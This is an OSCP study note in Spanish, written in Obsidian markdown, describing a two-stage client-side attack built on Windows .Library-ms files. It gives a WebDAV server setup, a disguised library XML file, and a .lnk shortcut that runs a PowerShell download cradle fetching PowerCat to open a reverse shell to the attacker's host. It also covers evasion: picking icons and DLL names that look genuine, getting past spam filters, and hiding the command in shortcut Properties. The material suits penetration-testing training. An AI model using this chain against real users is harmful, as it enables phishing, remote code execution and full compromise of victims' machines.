---
tipo: tecnica
tags:
  - oscp
  - explotacion
  - client-side
  - windows
fecha: 2026-09-29
---

# Windows Library Files (.Library-ms)

> [!abstract]
> Los ficheros `.Library-ms` son contenedores **XML** que conectan al usuario con ubicaciones remotas (WebDAV/SMB). Se ejecutan con doble clic y aparecen como una **carpeta local** en Explorer. Vector client-side ideal como **primera etapa**: los filtros de spam suelen **dejarlos pasar** (a diferencia de un enlace directo a un `.lnk`/`.exe`).

## Ataque en dos etapas
1. **Etapa 1** — la víctima abre el `.Library-ms` → monta nuestro **WebDAV** y lo muestra como carpeta local.
2. **Etapa 2** — dentro hay un `.lnk` que ejecuta un download cradle + PowerCat → **reverse shell**.

## 1) WebDAV en Kali (WsgiDAV)
```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
# comprobar en http://127.0.0.1
```

| Flag | Qué hace |
|---|---|
| `--host=0.0.0.0` | Escucha en todas las interfaces |
| `--port=80` | Puerto |
| `--auth=anonymous` | Sin autenticación |
| `--root` | Directorio raíz del share |

## 2) El fichero .Library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://KALI_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

| Tag | Función | Camuflaje |
|---|---|---|
| `name` | Nombre vía DLL+índice | `@windows.storage.dll,-34582` (evitar `shell32`, lo flaggean filtros de texto) |
| `isLibraryPinned` | Fijar en panel de navegación | `true` = más genuino |
| `iconReference` | Icono | `imageres.dll,-1003` (icono Pictures) / `-1002` (Documents) |
| `folderType` | Vista/columnas de Explorer | GUID de Documents |
| `url` | Ubicación remota | WebDAV de Kali |

> [!warning] Al abrirlo, Windows añade un tag `<serialized>` (base64) y cambia la `url` a `\\IP\DavWWWRoot`. Esto puede hacer que **falle en otra máquina o tras reiniciar** (share vacío). **Restaurar el XML original** antes de enviarlo a la víctima.

## 3) El shortcut .lnk (etapa 2)
Botón derecho → New → Shortcut. Destino:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI:8000/powercat.ps1');powercat -c KALI -p 4444 -e powershell"
```

> [!tip] Truco anti-inspección: añadir un **delimitador + comando benigno** detrás para empujar el comando malicioso fuera del área visible en Propiedades.

> [!important] Servir `powercat.ps1` desde un **web server Python**, no desde el WebDAV (escribible → el AV podría borrar el payload).

## 4) Entrega y ejecución
```bash
# Kali: http.server (powercat.ps1), wsgidav, nc -nvlp 4444
# copiar .lnk y .Library-ms a /home/kali/webdav, borrar test.txt
smbclient //VICTIMA/share -c 'put config.Library-ms'   # simular entrega
```
La víctima abre el `.Library-ms` → doble clic en el `.lnk` → reverse shell.

## Relacionado
- Módulo: [[12 - Client-side Attacks]]
- Alternativa client-side: [[Macros VBA Maliciosas (Office)]]
- Cheatsheet: [[Explotacion y Shells]] · [[Transferencia de archivos]]
